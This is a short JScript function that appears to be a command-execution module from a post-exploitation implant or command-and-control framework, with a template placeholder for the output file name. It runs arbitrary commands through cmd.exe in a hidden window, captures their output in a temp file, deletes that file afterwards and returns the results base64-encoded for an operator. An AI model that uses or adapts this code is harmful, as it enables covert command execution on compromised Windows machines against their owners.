function cmd(command) {
  tmp = wscriptshell.ExpandEnvironmentStrings("%TEMP%");
  stdout_path = tmp + '\\{{ command_stdout }}.txt';
  fs = new ActiveXObject("Scripting.FileSystemObject");
  compsec = wscriptshell.ExpandEnvironmentStrings("%COMSPEC%");
  command = compsec + ' /c ' + command + ' 1> ' + stdout_path + ' 2>&1';
  results = '';
  errors = '' ;
  if (fs.FileExists(stdout_path)) {
    errors = '\n[!] ' + stdout_path + ' stdout file already exists, this may cause issues.\n';
  }

  try {
    wscriptshell.Run(command, 0, true);
  } catch (e) {
    errors = errors + '[!] Failed to run command: ' + e.message + '\n';
  }

  try {
    fd = fs.OpenTextFile(stdout_path)
    results = results + fd.ReadAll();
    fd.close();
  } catch (e) {
    errors = errors + '[!] Failed to retrieve results: ' + e.message + '\n';
  }

  try {
    delfile(stdout_path);
  } catch (e) {
    errors = errors + '[!] Failed to remove stdout file, ' + stdout_path + ': ' + e.message + '\n' ;
  }

  return b64e(errors + '\n' + results);
}